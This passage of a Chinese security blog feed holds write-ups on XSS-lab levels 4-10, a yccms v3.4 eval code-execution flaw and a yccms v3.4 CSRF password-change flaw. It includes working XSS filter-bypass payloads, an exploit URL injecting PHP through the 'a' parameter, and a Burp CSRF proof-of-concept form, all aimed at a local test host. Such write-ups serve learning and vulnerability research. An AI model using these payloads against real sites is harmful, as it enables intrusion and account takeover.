onclick=alert(1)，没有弹，查看源码，发现无法跟value的引号进行闭合了，这是什么情况</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%207.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%207.png"></p><p>看下源码，看看是什么过滤先</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%208.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%208.png"></p><p>可以看到，首先将大小括号替换成了空，input控件的value的值是用双引号括起来的</p><p>这里有个规律，value的值如果最外层是双引号，则需要双引号去封闭，如果是单引号，就要用单引号去封闭，</p><p>使用下面的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(1)</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%209.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%209.png"></p><h2 id="第五关-过滤了关键字"><a href="#第五关-过滤了关键字" class="headerlink" title="第五关 过滤了关键字"></a>第五关 过滤了关键字</h2><p>输入一个基础的exp，可以看到&lt;script&gt;被过滤了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2010.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2010.png"></p><p>使用大小写绕过依然不行，看下源码是怎么过滤的 </p><p>这里对&lt;script和on进行了过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2011.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2011.png"></p><p>这就容易了，不能用script和on就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; &gt; &lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure><p>iframe跟input不是一个控件，因此需要用&gt;隔开</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2012.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2012.png"></p><h2 id="第六关-大小写绕过"><a href="#第六关-大小写绕过" class="headerlink" title="第六关 大小写绕过"></a>第六关 大小写绕过</h2><p>继续套用第五关用的exp，结果看到src被过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2013.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2013.png"></p><p>然后试了几个，发现<code>&lt;script&gt;&lt;href&gt;</code>也被过滤 ，看下源码，了解一下完整的过滤列表</p><p>可以看到以下几个过滤字段，但是并没有对大小括号进行过滤</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2014.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2014.png"></p><p>所以payload中，没这几个就可以了，这里用大小写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; &gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第七关-双写绕过"><a href="#第七关-双写绕过" class="headerlink" title="第七关 双写绕过"></a>第七关 双写绕过</h2><p>直接用上一关的exp，发现<code>&lt;script&gt;</code>被替换了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2015.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2015.png"></p><p>看下源码有哪些过滤，这里在上一关的基础上增加了大小写过滤，直接将所有字符小写化，如果匹配上了就替换为空</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2016.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2016.png"></p><p>既然这样，我们就用双写绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(1)</span><br></pre></td></tr></table></figure><p>此时后面还多了一个双引号</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2017.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2017.png"></p><p>用下面的exp进行封闭</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(1) &quot;</span><br></pre></td></tr></table></figure><h2 id="第八关-实体编码绕过"><a href="#第八关-实体编码绕过" class="headerlink" title="第八关 实体编码绕过"></a>第八关 实体编码绕过</h2><p>发现无法封闭</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2018.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2018.png"></p><p>看源码发现，不仅有之前的防护，还添加了对双引号的过滤，并且拒绝使用大小括号</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2019.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2019.png"></p><p>我们直接用<code>javascript:alert</code>也不行，因为中间的script会被替换</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2020.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2020.png"></p><p>使用下面的exp，t字符用<code>&amp;#116</code>来代替</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript&amp;#116:alert()</span><br></pre></td></tr></table></figure><p>执行完看到友情链接中插入了代码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2021.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2021.png"></p><p>点击友情链接，触发xss</p><h2 id="第九关-输入合法性检查"><a href="#第九关-输入合法性检查" class="headerlink" title="第九关 输入合法性检查"></a>第九关 输入合法性检查</h2><p>还是使用上一关的exp，但是在前端代码中没有插入成功，看下源码进行了哪些防护</p><p>可以看到对链接进行了合法性判断，字符串前面必须是<code>http://</code></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2022.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2022.png"></p><p>我们构造字符串把<code>http://</code>放在exp的前面肯定不行，这样会把js代码识别为网址</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2023.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2023.png"></p><p>exp如下，php中//表示注释，这样既可以绕过合法性检查，也可以把http://隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116:alert()//http://</span><br></pre></td></tr></table></figure><h2 id="第十关-隐藏的按钮"><a href="#第十关-隐藏的按钮" class="headerlink" title="第十关 隐藏的按钮"></a>第十关 隐藏的按钮</h2><p>这题没有看到输入框，在get参数中随意输入也没看到可注入的地方，查看前端代码可以看到默认有一些控件是隐藏的，我们把它显示出来 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2024.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2024.png"></p><p>将hidden改为show，下图中的三个框显示出来了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2025.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2025.png"></p><p>我们在get参数中添加t_sort</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2026.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2026.png"></p><p>在前端注入到value中</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2027.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2027.png"></p><p>最终的exp是:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert() type=&quot;button&quot;</span><br></pre></td></tr></table></figure><p>exp中将type改为了按钮，这样就可以点击按钮进行触发了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2028.png" alt="xss-lab%201-10%E5%85%B3%201d896838a3634be98810245205654d67/Untitled%2028.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-lab-1-10关&quot;&gt;&lt;a href=&quot;#xss-lab-1-10关&quot; class=&quot;headerlink&quot; title=&quot;xss-lab 1-10关&quot;&gt;&lt;/a&gt;xss-lab 1-10关&lt;/h1&gt;&lt;h2 id=&quot;第一关-get参数存在xss&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@yccms v3.4代码执行漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/18/web%E6%BC%8F%E6%B4%9E@yccms-v3-4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/18/web%E6%BC%8F%E6%B4%9E@yccms-v3-4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-18T09:17:19.000Z</published>
    <updated>2021-11-05T02:01:25.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-代码执行漏洞"><a href="#yccms-v3-4-代码执行漏洞" class="headerlink" title="yccms v3.4 代码执行漏洞"></a>yccms v3.4 代码执行漏洞</h1><p>查看/admin/index.php文件，这是后台首页的源代码，我们来看看里面的逻辑</p><p>这个文件主要的功能是通过require包含了run.inc.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,substr(dirname(<span class="keyword">__FILE__</span>),<span class="number">0</span>,<span class="number">-6</span>)).<span class="string">&#x27;/config/run.inc.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着看下run.inc.php文件</p><p>这个文件的主要的作用是自动加载类，这些类都在controller、model、public/class目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//开启session</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//超时时间</span></span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置编码</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="comment">//错误级别,报告警告之外的所有错误</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="comment">//设置时区</span></span><br><span class="line">date_default_timezone_set(<span class="string">&#x27;PRC&#x27;</span>); </span><br><span class="line"><span class="comment">//网站绝对根路径</span></span><br><span class="line">define(<span class="string">&#x27;ROOT_PATH&#x27;</span>,str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,substr(dirname(<span class="keyword">__FILE__</span>),<span class="number">0</span>,<span class="number">-7</span>))); </span><br><span class="line"><span class="comment">//引入配置文件</span></span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/config/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="comment">//引入Smarty</span></span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/public/smarty/Smarty.class.php&#x27;</span>;</span><br><span class="line"><span class="comment">//自动加载类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$_className</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$_className</span>,<span class="number">-6</span>)==<span class="string">&#x27;Action&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$_className</span>, <span class="number">-5</span>) == <span class="string">&#x27;Model&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">require</span> ROOT_PATH.<span class="string">&#x27;/public/class/&#x27;</span>.ucfirst(<span class="variable">$_className</span>).<span class="string">&#x27;.class.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//单入口</span></span><br><span class="line">Factory::setAction()-&gt;run();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在看到public/class/目录下的Factory.class.php类文件的时候，发现了一个代码执行的漏洞，该漏洞可以通过eval函数执行任意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">private</span> <span class="variable">$_obj</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setAction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#匹配get请求的a参数</span></span><br><span class="line"><span class="variable">$_a</span>=<span class="built_in">self</span>::getA();</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$_a</span>, <span class="keyword">array</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;nav&#x27;</span>, <span class="string">&#x27;article&#x27;</span>,<span class="string">&#x27;backup&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;link&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;xml&#x27;</span>,<span class="string">&#x27;online&#x27;</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>])) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location:&#x27;</span>.<span class="string">&#x27;?a=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setModel</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$_a</span> = <span class="built_in">self</span>::getA();</span><br><span class="line"><span class="keyword">if</span> (file_exists(ROOT_PATH.<span class="string">&#x27;/model/&#x27;</span>.<span class="variable">$_a</span>.<span class="string">&#x27;Model.class.php&#x27;</span>)) <span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Model();&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$_obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getA</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们主要看产生漏洞的核心代码，我们要利用这个漏洞，就要让eval函数执行我们的代码，也就是说要先通过第一句代码的if检查，通过了if检查，我们的代码执行就更近一步了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">&#x27;/controller/&#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action.class.php&#x27;</span>)) <span class="variable">$_a</span> = <span class="string">&#x27;Login&#x27;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br></pre></td></tr></table></figure><p>所以我们要解决两个问题：</p><p>1.file_exists逃逸</p><p>2.eval代码执行，并且插入我们的代码</p><p>下面我们来解决这两个问题</p><p>1.file_exists逃逸</p><p>这个file_exists会检查提供的文件路径是否存在，显然这里检查的是controller目录下的文件是否存在</p><p>我们可以看到controller目录下存在的一些文件，可以看到正好存在一个Action.class.php，如果a参数传递的是空，也是可以通过if检查的，那么如何传递个“空的”a参数呢并且还能执行代码呢？接着往下看</p><p><img src="https://i.loli.net/2021/04/18/VZEQXkxBNFvCTMU.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled.png"></p><p>file_exists函数本身存在一个bug，当接收的字符串中存在..//的时候会自动找到上一层目录，因此我们传递的a参数可以是这样的，在经过file_exists函数的时候会先执行到phpinfo();//，因为这里碰到个//，所以它会进入下一层目录，接着会碰到..//就会回到上一层目录，这样即执行了我们的代码，也相当于传了个“空的”参数，因为它去找了下一层目录，接着又往上一层目录去找，还是会找到Action.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();<span class="comment">//..//</span></span><br></pre></td></tr></table></figure><p>我们进行个小测试，我的C盘下存在C://GameCS/Counter-Strike目录</p><p><img src="https://i.loli.net/2021/04/18/Iv9zdRiFPsbDfkW.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%201.png"></p><p>通过执行下面的代码，返回的是1，这样不仅通过了检查，还执行了我们的代码phpinfo();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_exists(<span class="string">&#x27;C://GameCS//phpinfo();//..//Counter-Strike&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/WOCfPDRura9Sy6m.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%202.png"></p><p>所以我们只要在a参数中传递下面的字符串就可以绕过if判断了，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.0.21/yccms_v3.4/admin/?a=phpinfo();//..//</span></span><br></pre></td></tr></table></figure><p>2.eval执行我们的代码</p><p>光是绕过if判断还不够，我们看下eval函数执行时的操作，eval可以执行php代码，这里它进行了new操作，本意是想通过拼接，以动态的方式创建一个对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;self::$_obj = new &#x27;</span>.ucfirst(<span class="variable">$_a</span>).<span class="string">&#x27;Action();&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是如果我们以上面的exp去打，显然就会变成下面这样，这样程序就会报错，因为不存在phpinfo()对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">self</span>::<span class="variable">$_obj</span> = <span class="keyword">new</span> phpinfo();<span class="comment">//..//</span></span><br></pre></td></tr></table></figure><p>可以看到它会去public/class目录下去找phpinfo.class.php，这显示是不存在的</p><p><img src="https://i.loli.net/2021/04/18/KSqj9awp7g4RmGN.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%203.png"></p><p>我们需要让它创建一个存在的对象，public/class目录下是存在DB.class.php文件的，因此我们最终的exp可以是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.0.21/yccms_v3.4/admin/?a=DB();phpinfo();//..//</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/18/WQBdGsqNfXUHLC3.png" alt="yccms%20v3%204%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2066dbd424c9b24c04a72fd07e38cfa606/Untitled%204.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;yccms-v3-4-代码执行漏洞&quot;&gt;&lt;a href=&quot;#yccms-v3-4-代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;yccms v3.4 代码执行漏洞&quot;&gt;&lt;/a&gt;yccms v3.4 代码执行漏洞&lt;/h1&gt;&lt;p&gt;查看/admin/i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@yccms v3.4 csrf漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/17/web%E6%BC%8F%E6%B4%9E@yccms-v3-4-csrf%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/17/web%E6%BC%8F%E6%B4%9E@yccms-v3-4-csrf%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-17T08:31:22.000Z</published>
    <updated>2021-11-05T02:01:25.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>yccms v3.4</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>搭建好环境登陆后台</p><p><a href="http://192.168.0.21/yccms_v3.4/admin">http://192.168.0.21/yccms_v3.4/admin</a></p><p>默认密码admin,admin</p><p>登陆成功后执行下面的poc就会成功将密码修改为admin2，后台登陆状态会强制下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://192.168.0.21/yccms_v3.4/admin/?a=admin&amp;m=update&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;admin&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;admin2&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;notpassword&quot;</span> value=<span class="string">&quot;admin2&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;send&quot;</span> value=<span class="string">&quot;ä&amp;#191;&amp;#174;æ&amp;#148;&amp;#185;å&amp;#175;&amp;#134;ç&amp;#160;&amp;#129;&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>先找到根目录下控制器文件夹C:\phpstudy_pro\WWW\yccms_v3.4\controller</p><p>可以知道admin路径对应的是AdminAction控制器</p><p><img src="https://i.loli.net/2021/04/17/soy8E1CfXVMe6hD.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled.png"></p><p>接下来看下AdminAction.class.php，可以看到修改密码的函数 </p><p><img src="https://i.loli.net/2021/04/17/OSWRVYmHaAhl4T3.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%201.png"></p><p>我们在后台找到修改密码的地方进行抓包对比</p><p>a对应action,m对应method，再通过post请求发送username、password、notpassword、send这几个参数就可以发送修改密码的请求</p><p>可以看到这里并没有要求输入旧密码，因此可以生成个csrf，测试有没有csrf漏洞</p><p><img src="https://i.loli.net/2021/04/17/aMwkANo3pntsDmi.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%202.png"></p><p>登陆后台后，点击生成的poc文件，密码会被修改</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;yccms v3.4&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web漏洞@YCCMS V3.4存在XSS漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/17/web%E6%BC%8F%E6%B4%9E@YCCMS-V3-4%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/17/web%E6%BC%8F%E6%B4%9E@YCCMS-V3-4%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-17T07:50:57.000Z</published>
    <updated>2021-11-05T02:01:25.863Z</updated>
    
